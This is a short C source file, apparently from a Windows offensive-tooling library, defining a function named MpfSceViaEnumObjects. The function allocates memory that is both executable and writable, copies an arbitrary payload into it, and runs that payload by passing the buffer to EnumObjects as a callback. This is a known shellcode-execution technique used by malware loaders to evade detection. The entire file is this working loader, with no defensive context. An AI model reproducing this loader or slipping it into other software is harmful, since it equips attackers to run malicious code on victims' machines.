#include "Win32Helper.h"

VOID InvokeEnumObjectsThreadCallbackRoutine(LPVOID lpParameter)
{
	LOGFONTW Font = { 0 };
	Font.lfCharSet = DEFAULT_CHARSET;

	EnumObjects(GetDC(NULL), OBJ_BRUSH, (GOBJENUMPROC)lpParameter, NULL);
}

BOOL MpfSceViaEnumObjects(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumObjectsThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}